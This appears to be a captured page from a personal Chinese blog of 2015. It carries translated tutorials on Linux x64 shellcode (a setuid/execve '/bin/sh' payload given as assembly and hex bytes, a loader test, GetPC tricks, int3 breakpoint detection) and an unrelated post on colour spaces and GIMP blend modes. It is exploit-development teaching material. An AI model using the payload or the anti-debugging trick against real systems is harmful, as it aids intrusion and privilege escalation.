+ <span class="special">~</span>/Work/project/blackhat/shellcode  ./loader64 <span class="formula">$(echo -en "<span class="command">\x</span>48<span class="command">\x</span>31<span class="command">\xff</span><span class="command">\x</span>6a<span class="command">\x</span>69<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05<span class="command">\x</span>57<span class="command">\x</span>57<span class="command">\x</span>5e<span class="command">\x</span>5a<span class="command">\x</span>48<span class="command">\xbf</span><span class="command">\x</span>6a<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>73<span class="command">\x</span>68<span class="command">\x</span>48<span class="command">\xc</span>1<span class="command">\xef</span><span class="command">\x</span>08<span class="command">\x</span>57<span class="command">\x</span>54<span class="command">\x</span>5f<span class="command">\x</span>6a<span class="command">\x</span>3b<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05")
+<span class="special">[</span>reverland@gentoo shellcode<span class="special">]</span>$</span>
+</code></pre><p>这个shellcode来自之前启动一个shell的shellcode，注意提示符。</p>
+<h2 id="基于返回的载入器">基于返回的载入器</h2><p>基于返回的代码也能用载入器测试，而且更小，不需要分配内存。</p>
+<pre><code><span class="label">_start:</span>
+    <span class="keyword">pop</span> <span class="literal">rbx</span>
+    <span class="keyword">pop</span> <span class="literal">rbx</span>
+    <span class="keyword">pop</span> <span class="literal">rsp</span> <span class="comment">; rsp现在指向第一个参数</span>
+    <span class="keyword">ret</span>
+</code></pre><p>只是我觉得，似乎参数位置是不可执行的。关于ROP，以后说吧</p>
+<p>最后还有些动态载入和动态socket载入器。当shellcode依赖有漏洞二进制程序上下文时包含一个链接的动态部分，这是啥我现在还不知道。。。。。。</p>
+<p>下一篇<a href="http://blackhat.life/Shellcode/Dynamic" target="_blank" rel="external">Dynamic shellcode</a></p>
+
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/exploit/2015/03/16/shellcode/" itemprop="url">
+                  Shellcode
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2015-03-16T00:00:00+08:00" content="2015-03-16">
+              2015-03-16
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/exploit/2015/03/16/shellcode/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/16/shellcode/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <p>意译：<a href="http://blackhat.life/Shellcode" target="_blank" rel="external">category:Shellcode</a></p>
+<p>Shellcode，也叫bytecode，是用在缓冲区溢出漏洞挖掘中的机器码(用十六进制表示的二进制文件)，或者为了方便人类阅读写成汇编。程序员能使用机器码，用汇编方法写任何应用程序(就像所有其它高级编程语言一样)。并且不像很多语言只限定在某个操作系统或指令架构上。</p>
+<p>shellcode需要位计算、linux汇编和栈溢出的基础知识。</p>
+<p>[TOC]</p>
+<p>每种语言最后都解释为二进制，不管是编译的(compile-time)还是解释(runtime)。编写缓冲区溢出时要记住，有很多潜在的来自安全机制的障碍(比如DEP、ASLR、防火墙、或者IDS或者IPS应用)。一次面对现代对策的成功漏洞利用，需要利用许多过滤绕过和IDS侵入技术。</p>
+<h2 id="类型">类型</h2><p>根据执行代码的目标环境有许多类型的shellcode，在OSI模型不同层次有不同种类的对策，需要有不同的技术来成功挖掘指定的应用漏洞。</p>
+<h3 id="可执行程序(executable)_vs_基于返回的(return-oriented)">可执行程序(executable) vs 基于返回的(return-oriented)</h3><p>大致从运行时观点看有两种shellcode：可执行shellcode和基于返回的shellcode。这要看目标环境是否能执行数据栈来决定选择哪种。如果目标合适，基于返回的shellcode无视栈是否能执行，而可执行的shellcode只能在可执行栈上运行。</p>
+<ul>
+<li><p>可执行shellcode在它相应的目标操作系统中用汇编写成，大多数可执行shellcode，或者传统的null-free shellcode，可以用在任何有漏洞且有可执行栈的应用上。</p>
+</li>
+<li><p>基于返回的shellcode当堆栈不可执行时利用ROP(return oriented programming).通常通过构造调用栈模仿正常的编译程序来调用可执行shellcode。因为调用栈被视为数据，这在漏洞挖掘中绕过了需要栈可执行的限制。</p>
+</li>
+</ul>
+<p>然而，特定指令集架构比如MIPS，不能使用基于返回的编程技术或者传统的堆栈溢出，因为它们不在栈上存储返回地址。</p>
+<h3 id="对策和措施">对策和措施</h3><p>尽管传统二进制shellcode通常能顺利工作在没过滤机制、没打补丁、或者大输入的情况下，许多目标环境和应用也有许多限制因素来组织传统机器码执行。许多C或者C++写成的应用都需要机器码是null-free的(没有<code>\x00</code>)，这就是为何null-free shellcode是可执行shellcode编程的传统基础形式。</p>
+<ul>
+<li>字符过滤可以利用多态(自修改)来在允许字符集外运行时构造字节，来绕过限制。许多字符过滤限制到可打印字符集，所以ascii和alphanumeric shellcode变成该技术的主导技术。</li>
+<li>字符编码能通过编码载荷使之解码为相应的十六进制机器码绕过。通常代码必须在被拷贝到有漏洞的缓冲区前经过unicode、base64、大小写转换或者其它解码仍然存在。</li>
+<li>缓冲区尺寸也许惊人有限，某些环境中载荷太大不能放入缓冲区，这时就需要二次注入技术(second-order-injection)。结果是shellcode尺寸保持在最小来优化重用。</li>
+<li>防火墙通过阻碍外出连接或者监听socket接收流量来限制远程shellcode。绕过防火墙技术可以通过文件描述符重用技术实现。</li>
+<li>分析者可能调试有漏洞的应用尝试逆向工程挖掘过程。int3断点探测和单向哈希(one-way hashing)技术能组织取证分析工具比如volatility</li>
+<li>签名通常特别阻止linux shellcode因为系统调用传统上被用来作为C调用风格的接口，因此大多给定shellcode的静态部分都有个C接口。甚至多态和自修改代码通常都生成包含系统调用的shellcodes。系统调用可以通过子链接代码实现。</li>
+</ul>
+<h2 id="shellcode机理">shellcode机理</h2><p>shellcode通常用汇编写成。尽管有人能记住助记符表来直接写机器码，这并不适合初学者所以不推荐。</p>
+<p>环境因子：</p>
+<ul>
+<li>许多应用和安全措施组件都部分过滤输入，限制指令集的可能。有时候这在覆盖返回地址时甚至都有影响。</li>
+<li>操作系统对C API有不同的处理。通常(不是总是)linux上的shellcode依赖内核终端或者没链接的(unlinked)调用，而微软windows不提供中断API，shellcode必须利用PE解析来执行运行时链接。</li>
+</ul>
+<h2 id="汇编代码">汇编代码</h2><p>创建一个叫<code>test_shellcode.s</code>的文件</p>
+<p>这个例子使用hatter的32字节 null-free payload，这个shellcode完成<code>setuid(0);execve(&#39;/bin/sh&#39;, null, null)</code>。拷贝以下代码到<code>test_shellcode.s</code>并保存。</p>
+<pre><code><span class="built_in">BITS</span> <span class="number">64</span>
+<span class="built_in">global</span> _start
+<span class="label">start:</span>
+    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
+    <span class="keyword">push</span> <span class="preprocessor">qword</span> <span class="number">0x69</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span>
+    <span class="keyword">syscall</span>
+
+    <span class="keyword">push</span> <span class="literal">rdi</span>
+    <span class="keyword">push</span> <span class="literal">rdi</span>
+    <span class="keyword">pop</span> <span class="literal">rsi</span>
+    <span class="keyword">pop</span> <span class="literal">rdx</span>
+    <span class="keyword">push</span> <span class="preprocessor">qword</span> <span class="number">0x68</span>
+    <span class="keyword">mov</span> <span class="literal">rax</span>, <span class="preprocessor">qword</span> <span class="number">0x7361622f6e69622f</span>
+    <span class="keyword">push</span> <span class="literal">rax</span>
+    <span class="keyword">push</span> <span class="literal">rsp</span>
+    <span class="keyword">pop</span> <span class="literal">rdi</span>
+    <span class="keyword">push</span> <span class="preprocessor">qword</span> <span class="number">0x3b</span>
+    <span class="keyword">pop</span> <span class="literal">rax</span>
+    <span class="keyword">syscall</span>
+</code></pre><p>我又是用nasm编译而不是gas。。。</p>
+<pre><code>nasm <span class="built_in">test</span>_shellcode.s -o <span class="built_in">test</span>_shellcode.o
+</code></pre><h2 id="提取shellcode">提取shellcode</h2><p>提取二进制字节码有许多方法，objdump可以(不过这时nasm生成的目标文件不包含二进制文件信息，所以要指定<code>nasm -felf64</code>这样生成包含符号表或者ELF文件头的文件), hexdump可以看。。。。。。不过译者喜欢用ndiasm，显然必须指定类型什么的。</p>
+<pre><code> ~/Work/project/blackhat/shellcode  ndisasm -b64 -pamd test_shellcode.o
+<span class="number">00000000</span>  <span class="number">4831F</span>F            xor rdi,rdi
+<span class="number">00000003</span>  <span class="number">6</span>A69              push byte +<span class="number">0x69</span>
+<span class="number">00000005</span>  <span class="number">58</span>                pop rax
+<span class="number">00000006</span>  <span class="number">0F</span>05              syscall
+<span class="number">00000008</span>  <span class="number">57</span>                push rdi
+<span class="number">00000009</span>  <span class="number">57</span>                push rdi
+<span class="number">0000000</span>A  <span class="number">5</span>E                pop rsi
+<span class="number">0000000</span>B  <span class="number">5</span>A                pop rdx
+<span class="number">0000000</span>C  <span class="number">6</span>A68              push byte +<span class="number">0x68</span>
+<span class="number">0000000</span>E  <span class="number">48</span>B82F62696E2F62  mov rax,<span class="number">0x7361622f6e69622f</span>
+         -<span class="number">6173</span>
+<span class="number">00000018</span>  <span class="number">50</span>                push rax
+<span class="number">00000019</span>  <span class="number">54</span>                push rsp
+<span class="number">0000001</span>A  <span class="number">5F</span>                pop rdi
+<span class="number">0000001</span>B  <span class="number">6</span>A3B              push byte +<span class="number">0x3b</span>
+<span class="number">0000001</span>D  <span class="number">58</span>                pop rax
+<span class="number">0000001</span>E  <span class="number">0F</span>05              syscall
+</code></pre><p>中间部分包含指定汇编的字节指令。大多数调试器也展示对应汇编代码的十六进制记法。</p>
+<pre><code> <span class="special">~</span>/Work/project/blackhat/shellcode  od -t x1 test_shellcode.o | awk '<span class="special">{</span><span class="formula">$1=""; print<span class="special">}</span>'|sed 'N;s/<span class="command">\n</span>//g;s/ /<span class="command">\\</span>x/g' 
+<span class="command">\x</span>48<span class="command">\x</span>31<span class="command">\xff</span><span class="command">\x</span>6a<span class="command">\x</span>69<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05<span class="command">\x</span>57<span class="command">\x</span>57<span class="command">\x</span>5e<span class="command">\x</span>5a<span class="command">\x</span>6a<span class="command">\x</span>68<span class="command">\x</span>48<span class="command">\xb</span>8<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>61<span class="command">\x</span>73<span class="command">\x</span>50<span class="command">\x</span>54<span class="command">\x</span>5f<span class="command">\x</span>6a<span class="command">\x</span>3b<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05</span>
+</code></pre><h3 id="shellcode反汇编">shellcode反汇编</h3><p>许多次你看到来自‘野外的’shellcode，例如分析恶意软件和新的exploit，这时你需要反汇编shellcode来学习。最简单的方式是使用objdump(还是习惯ndiasm，呵呵)本例我们使用我们构建的实例。</p>
+<p>就是这么简单：</p>
+<pre><code> ~/Work/project/blackhat/shellcode   echo -en <span class="string">"\x48\x31\xff\x6a\x69\x58\x0f\x05\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"</span> &gt; shellcode ; ndisasm -b64 -pamd shellcode      
+<span class="number">00000000</span>  <span class="number">4831F</span>F            xor rdi,rdi
+<span class="number">00000003</span>  <span class="number">6</span>A69              push byte +<span class="number">0x69</span>
+<span class="number">00000005</span>  <span class="number">58</span>                pop rax
+<span class="number">00000006</span>  <span class="number">0F</span>05              syscall
+<span class="number">00000008</span>  <span class="number">57</span>                push rdi
+<span class="number">00000009</span>  <span class="number">57</span>                push rdi
+<span class="number">0000000</span>A  <span class="number">5</span>E                pop rsi
+<span class="number">0000000</span>B  <span class="number">5</span>A                pop rdx
+<span class="number">0000000</span>C  <span class="number">48</span>BF6A2F62696E2F  mov rdi,<span class="number">0x68732f6e69622f6a</span>
+         -<span class="number">7368</span>
+<span class="number">00000016</span>  <span class="number">48</span>C1EF08          shr rdi,byte <span class="number">0x8</span>
+<span class="number">0000001</span>A  <span class="number">57</span>                push rdi
+<span class="number">0000001</span>B  <span class="number">54</span>                push rsp
+<span class="number">0000001</span>C  <span class="number">5F</span>                pop rdi
+<span class="number">0000001</span>D  <span class="number">6</span>A3B              push byte +<span class="number">0x3b</span>
+<span class="number">0000001F</span>  <span class="number">58</span>                pop rax
+<span class="number">00000020</span>  <span class="number">0F</span>05              syscall
+</code></pre>
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/exploit/2015/03/11/shellcodeenvironment/" itemprop="url">
+                  Shellcode/Environment
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2015-03-11T00:00:00+08:00" content="2015-03-11">
+              2015-03-11
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/exploit/2015/03/11/shellcodeenvironment/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/11/shellcodeenvironment/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <p>源自：<a href="http://blackhat.life/Shellcode/Environment" target="_blank" rel="external">blackhat.life/Shellcode/Environment</a>，意译，原文是用gas的，我比较喜欢nasm语法。。。。。。</p>
+<p>一般汇编文件开头这样写入口：</p>
+<pre><code><span class="keyword">global</span> _start
+_star<span class="variable">t:</span>
+</code></pre><p>然后，比如64位，</p>
+<pre><code>nasm <span class="operator">-f</span> elf64 get_pc_64.s
+</code></pre><p>最后链接：</p>
+<pre><code>ld get_pc_64<span class="class">.o</span> -o get_pc_64
+</code></pre><p>可以用gdb来载入查看</p>
+<pre><code> ~/Work/project/blackhat/shellcode  gdb -q a.out
+Reading symbols from /home/reverland/Work/project/blackhat/shellcode/a.out...(no debugging symbols found)...done.
+(gdb) disassemble _start,+<span class="number">10</span>
+Dump of assembler code from <span class="number">0x4000b0</span> to <span class="number">0x4000ba</span>:
+   <span class="number">0x00000000004000b0</span> &lt;_start+<span class="number">0</span>&gt;:       jmp    <span class="number">0x4000b3</span> &lt;startup&gt;
+   <span class="number">0x00000000004000b2</span> &lt;pc+<span class="number">0</span>&gt;:   nop
+   <span class="number">0x00000000004000b3</span> &lt;startup+<span class="number">0</span>&gt;:      lea    rax,[rip+<span class="number">0xfffffffffffffff8</span>]        <span class="preprocessor"># <span class="number">0x4000b2</span> &lt;pc&gt;</span>
+End of assembler dump.
+</code></pre><p>不过只是为了看汇编效果的话，不用链接直接看就是</p>
+<pre><code>~ objdump -d -M intel last_call_32<span class="class">.o</span>
+last_call_32<span class="class">.o</span>:     file format elf32-i386
+
+Disassembly of <span class="tag">section</span> <span class="class">.text</span>:
+
+<span class="number">00000000</span> &lt;_start&gt;:
+   <span class="number">0</span>:   <span class="number">8</span>b <span class="number">44</span> <span class="number">24</span> fc             mov    eax,DWORD PTR [esp-<span class="number">0</span>x4]
+</code></pre><p>另外<code>ndisasm</code>和<code>rasm2</code>用不顺手，怎么和我想得到的结果不一样= =</p>
+<p>好了，废话完了，正文。</p>
+<hr>
+<p>shellcode能在当前环境下，探测指令集架构，程序指针，上一个返回的地址，或者绕过和探测int3断点。</p>
+<h2 id="探测指令集架构">探测指令集架构</h2><p><a href="http://phrack.org/issues/57/17.html" target="_blank" rel="external">Architecture Spanning Shellcode</a></p>
+<h2 id="GetPc">GetPc</h2><p>GetPc是用来获得当前指令指针的技术。如果写自修改shellcode这个挺游泳，或者对那些必须知道自己所处环境的shellcode，因为环境信息在代码执行前不可预知。</p>
+<h3 id="x86">x86</h3><p>call会把下一行地址压栈</p>
+<pre><code><span class="keyword">jmp</span> startup
+<span class="label">getpc:</span>
+   <span class="keyword">mov</span> eax [esp]
+   <span class="keyword">ret</span>
+<span class="label">startup:</span>
+<span class="keyword">call</span> getpc       <span class="comment">; the %eax register now contains %eip on the next line</span>
+</code></pre><h3 id="x64">x64</h3><p>同理</p>
+<pre><code><span class="keyword">jmp</span> startup
+<span class="label">getpc:</span>
+   <span class="keyword">mov</span> rax, [rsp]
+   <span class="keyword">ret</span>
+<span class="label">startup:</span>
+<span class="keyword">call</span> getpc       <span class="comment">; the %rax register now contains %rip on the next line </span>
+</code></pre><p>或者x64可以直接操作rip</p>
+<pre><code><span class="keyword">jmp</span> startup
+<span class="label">pc:</span>
+  <span class="keyword">nop</span>
+<span class="label">startup:</span>
+  <span class="keyword">lea</span> <span class="literal">rax</span>, [<span class="preprocessor">rel</span> pc]  <span class="comment">; the %rax register now contains the address of `pc'.</span>
+</code></pre><h2 id="上次调用返回地址">上次调用返回地址</h2><p>一般情况下，在缓冲区溢出攻击中执行shellcode，假设nop sled没有改变堆栈，函数的返回地址是<code>[rsp-0x8]</code>或者<code>[esp-0x4]</code>，就是在溢出过程中覆盖的掉那个堆栈返回的地址。很多情况下，这能在写多态shellcode时替代GetPc. alphanumeric last call在64位系统中有13字节。</p>
+<h3 id="32位">32位</h3><p>Null-free的shellcode(没有<code>\x00</code>)</p>
+<pre><code><span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">esp</span>-<span class="number">0x4</span>]
+</code></pre><h3 id="64位">64位</h3><p>Null-free</p>
+<pre><code><span class="keyword">mov</span> [<span class="literal">rax</span>], [<span class="literal">rsp</span>-<span class="number">0x8</span>]
+</code></pre><h2 id="int3断点">int3断点</h2><p>int3断点可以被探测出来。</p>
+<pre><code><span class="built_in">global</span> _start
+<span class="label">_start:</span>
+<span class="keyword">jmp</span> startup
+<span class="label">
+go_retro:</span>
+<span class="keyword">pop</span> <span class="literal">rcx</span>
+<span class="keyword">inc</span> <span class="literal">rcx</span>
+<span class="keyword">jmp</span> [<span class="literal">rcx</span>]
+<span class="label">
+startup:</span>
+<span class="keyword">call</span> go_retro
+<span class="label">
+volatile_segment:</span>
+<span class="keyword">push</span> <span class="number">0x3458686a</span>
+<span class="keyword">push</span> <span class="number">0x0975c084</span>
+<span class="keyword">nop</span>
+</code></pre><p>关键的代码在</p>
+<pre><code><span class="keyword">push</span> <span class="number">0x3458686a</span>
+<span class="keyword">push</span> <span class="number">0x0975c084</span>
+</code></pre><p>这是啥呢？</p>
+<pre><code> ~/Work/project/blackhat/shellcode  rasm2 -d <span class="string">"6a6858346885c07509"</span>
+<span class="keyword">push</span> <span class="number">0x68</span>
+<span class="keyword">pop</span> <span class="literal">eax</span>
+<span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x68</span>
+<span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+<span class="keyword">jne</span> <span class="number">0x12</span>
+</code></pre><p>当在第二个push加断点时，会把上一个字节暂改为<code>\xcc</code></p>
+<pre><code><span class="number">000000000000000</span>d &lt;volatile_segment&gt;:
+   d:   <span class="number">68</span> <span class="number">6</span>a <span class="number">68</span> <span class="number">58</span> cc          push   <span class="number">0xcc58686a</span>
+  <span class="number">12</span>:   <span class="number">68</span> <span class="number">84</span> c0 <span class="number">75</span> <span class="number">09</span>          push   <span class="number">0x975c084</span>
+  <span class="number">17</span>:   <span class="number">90</span>                      nop
+</code></pre><p>这时，推到栈上的就是：</p>
+<pre><code> ~/Work/project/blackhat/shellcode  rasm2 -d <span class="string">"6a685834cc85c07509"</span>
+<span class="keyword">push</span> <span class="number">0x68</span>
+<span class="keyword">pop</span> <span class="literal">eax</span>
+<span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0xffffffcc</span>
+<span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+<span class="keyword">jne</span> <span class="number">0x12</span>
+</code></pre><p>这样就会向前跳0x12而不是激发断点。</p>
+<p>我们可以试试，下次再写loader，所以。。。</p>
+<pre><code> ~/Work/project/blackhat/shellcode  gdb -q detect_breakpoint
+Reading symbols from /home/lyy/Work/project/blackhat/shellcode/detect_breakpoint...(no debugging symbols found)..<span class="string">.done</span>.
+(gdb) disassemble _start,+<span class="number">20</span>
+Dump of assembler code from <span class="number">0x4000b0</span> to <span class="number">0x4000c4</span>:
+   <span class="number">0x00000000004000b0</span> &lt;_start+<span class="number">0</span>&gt;:       <span class="keyword">jmp</span>    <span class="number">0x4000b8</span> &lt;startup&gt;
+   <span class="number">0x00000000004000b2</span> &lt;go_retro+<span class="number">0</span>&gt;:     <span class="keyword">pop</span>    <span class="literal">rcx</span>
+   <span class="number">0x00000000004000b3</span> &lt;go_retro+<span class="number">1</span>&gt;:     <span class="keyword">inc</span>    <span class="literal">rcx</span>
+   <span class="number">0x00000000004000b6</span> &lt;go_retro+<span class="number">4</span>&gt;:     <span class="keyword">jmp</span>    <span class="preprocessor">QWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">rcx</span>]
+   <span class="number">0x00000000004000b8</span> &lt;startup+<span class="number">0</span>&gt;:      <span class="keyword">call</span>   <span class="number">0x4000b2</span> &lt;go_retro&gt;
+   <span class="number">0x00000000004000bd</span> &lt;volatile_segment+<span class="number">0</span>&gt;:     <span class="keyword">push</span>   <span class="number">0x3458686a</span>
+   <span class="number">0x00000000004000c2</span> &lt;volatile_segment+<span class="number">5</span>&gt;:     <span class="keyword">push</span>   <span class="number">0x975c084</span>
+End of assembler dump.
+(gdb) b *<span class="number">0x00000000004000c2</span>
+Breakpoint <span class="number">1</span> <span class="preprocessor">at</span> <span class="number">0x4000c2</span>
+(gdb) r
+Starting program: /home/lyy/Work/project/blackhat/shellcode/detect_breakpoint 
+<span class="label">warning:</span> no loadable sections found <span class="keyword">in</span> added symbol-file system-supplied DSO <span class="preprocessor">at</span> <span class="number">0x7ffff7ffd000</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="number">0x00000000004000b6</span> <span class="keyword">in</span> go_retro ()
+(gdb) 
+</code></pre><p>没有碰到断点！！(那啥sigsegv了，看样子shellcode loader应该先写。。。)</p>
+<p>ps: 这让我想起来之前反gdb调试的一些学习，下次再写吧</p>
+<h2 id="跑题的吐槽">跑题的吐槽</h2><p>作为一个什么都会点什么都不会的渣，也被推到投简历找实习的浪潮之中，立马被北邮的互联网求职氛围吓尿了，看到<a href="http://yanyiwu.com/work/2015/03/06/programmer-in-school.html" target="_blank" rel="external">bswgd在《谈谈在校程序员技能培养》</a>中谈到：</p>
+<blockquote>
+<p>几乎是从事互联网行业的人都知道，北邮人找互联网的工作特别拿手。 甚至被说成如蝗虫过境一般。事实却是也是如此。</p>
+</blockquote>
+<p>往身边看看，真是这感觉。。。</p>
+<p>看了<a href="http://lilydjwg.is-programmer.com/posts/58837.html" target="_blank" rel="external">依云仙子的《再三错过》</a>中心理好难过，阴影一直如影随形。</p>
+<p>于是在大家都投完简历我还是拖延着什么也没写，只是把仙子当年的感慨找来看了看。</p>
+<p>至于我自己，还是趁着没毕业多调查下吧</p>
+
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/art/2015/03/09//" itemprop="url">
+                  谈谈色彩空间和混合模式
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2015-03-09T00:00:00+08:00" content="2015-03-09">
+              2015-03-09
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/art/" itemprop="url" rel="index">
+                    <span itemprop="name">art</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/art/2015/03/09//#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="art/2015/03/09//" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <p>图层模式和色彩空间理论，在寒假的时候就很好奇，找来gimp的文档看了看图层模式还是有些糊里糊涂。关于色彩理论，看到图像处理新闻组(好像很古老的东西了)上推荐这篇文章<a href="http://www.poynton.com/ColorFAQ.html" target="_blank" rel="external">Color FAQ</a>，看上去似乎很不错的样子，但好像不适合入门。</p>
+<p>后来看到一本1996年关于gimp的书<a href="http://gimp-savvy.com/BOOK/index.html?node52.html" target="_blank" rel="external">Grokking the GIMP</a>，虽然似乎有些古老的样子，但一目了然，很多东西，十年都未曾变化。</p>
+<h2 id="色彩基础">色彩基础</h2><h3 id="RGB空间">RGB空间</h3><p>即通过Red、Green、Blue来表示其它颜色的方法。每种颜色都取0-255之间的值。这样整个色彩空间可以表示在R、G、B为轴的立方体内。</p>
+<p>一般看来，越往对角线方向色彩感觉越亮。</p>
+<h3 id="HSV空间">HSV空间</h3><p>这里有几个定义：</p>
+<p>lightness：L = (MAX(R, G, B) + MIN(R, G, B))/2<br>value: V = MAX(R, G, B)<br>luminance: Y = 0.30R + 0.69G + 0.11B<br>brightness: (R + G + B)/3</p>
+<p>luminance更符合人的主观亮度感受。brightness和人的感受差别较大，一般不用而用luminance。</p>
+<p>那HSV模型在RGB空间是什么样的呢。</p>
+<h3 id="HSV和RGB关系">HSV和RGB关系</h3><p>在RGB空间所在的立方体中，主对角线被成为Neutral line。这条线从原点到(255,255,255)逐渐从黑色过度到灰色到更浅的灰色到白色。</p>
+<p>HSV中固定H，则获得过这条线的一面。固定S，则获得以此为轴原点为顶点的圆锥面。固定V，则获得关于此线垂直的面。</p>
+<h3 id="CMYK减法模型">CMYK减法模型</h3><p>这是印刷中常用的，RGB用在发光模型中，CMY(K)用在反光模型中。k应该不超过MAX(C, M, Y)</p>
+<h3 id="转换为灰度图像">转换为灰度图像</h3><p>有三种方法：</p>
+<ol>
+<li>Grayscale: 通过计算luminance，这个符合人眼对亮度的感觉</li>
+<li>Desaturate: 计算lightness。实际上保留了RGB分量</li>
+<li>Decompose HSV:抽取HSV中的V</li>
+</ol>
+<p>V &gt; L或Y，所以显然V最亮，但人眼会感觉Grayscale效果最好。所以后两种方法常用在分离图像上。</p>
+<h2 id="图层模式">图层模式</h2><p>这是关于两个或多个图层的故事，上面的记为F，下面的记为B</p>
+<h3 id="Normal,_Dissolve,_Behind模式">Normal, Dissolve, Behind模式</h3><p>Normal没啥特别的，溶解和F图层的透明度有关，透明度越大，B透过的越多。</p>
+<p>behind是个特殊的画笔才能用的模式，就像在玻璃背面画图一样</p>
+<h3 id="Addition，Substract，_Difference模式">Addition，Substract， Difference模式</h3><p>运算符号表示各个分量独立运算。W为白色</p>
+<p>加法：<br>    R = min(F + B, W)</p>
+<p>减法：<br>    R = max(B - F, 0)</p>
+<p>差分：<br>    R = |F - B|</p>
+<p>前两种方法可能会造车个部分额区域变得全白或全黑，丢失部分信息。</p>
+<h3 id="multiply(burn),_Divide(Dodge),_Screen,_Overlay模式">multiply(burn), Divide(Dodge), Screen, Overlay模式</h3><p>发现变化也不少，现在又是hard light又是啥的，burn也不是multiply，Divide也不是Dodge了。不过也差不多，burn和dodge只是把相应multiply和divide的F反色了(255-F)</p>
+<p>正片叠底：<br>    R = (F x B)/255</p>
+<p>得到的结果比F和B都暗</p>
+<p>除法：<br>    R = MIN(W, B x 256 / (F + 1))</p>
+<p>结果比B亮，有可能变白丢失信息</p>
+<p>滤色：<br>    R = 255 - 1/255 x (255- F) x (255 - B)</p>
+<p>滤色原理和乘法类似，只是是从W开始向原点计算。结果是图像所有地方都变亮，但并不会出现某些区域全变白色丢失信息。</p>
